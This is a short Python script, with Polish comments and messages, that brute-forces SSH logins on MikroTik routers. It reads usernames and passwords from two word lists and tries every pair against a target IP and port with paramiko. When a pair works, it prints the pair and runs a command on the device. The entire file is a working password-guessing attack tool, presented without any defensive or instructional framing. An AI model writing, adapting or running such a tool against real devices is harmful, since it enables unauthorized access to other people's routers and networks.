#MikroTik ssh brute forcer
import sys, paramiko
command = "quit"

loginy = open("loginy.txt", "r")


while True:
    if len(sys.argv) < 3:
        print('''\nZa mala ilosc argumentow. Skladnia: brut_ssh.py <ip> <port>''')
        exit()
    
    linia_login = loginy.readline()
    if linia_login == '':
        break
    linia_login = linia_login.strip('\n')
    hasla = open("hasla.txt", "r")
    while True:
        linia_haslo = hasla.readline()
        linia_haslo = linia_haslo.strip('\n')
        if linia_haslo == '':
            break
        print("sprawdzam pare: ", linia_login, linia_haslo, "\n")
        try:
            client = paramiko.SSHClient()
            client.load_system_host_keys()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(str(sys.argv[1]), str(sys.argv[2]), username=linia_login, password=linia_haslo)
            print("zgodna para: ", linia_login, linia_haslo, "\n")
            stdin, stdout, stderr = client.exec_command(command)
            print(stdout.read())
            exit()
        except paramiko.ssh_exception.AuthenticationException as ssherr:
            print (ssherr)
        except paramiko.ssh_exception.SSHException as ssherr:
            print (ssherr)
        except paramiko.ssh_exception.socket.error as ssherr:
            print (ssherr)
        except paramiko.ssh_exception.BadHostKeyException as ssherr:
            print (ssherr)
        finally:
            client.close()
print ("done")
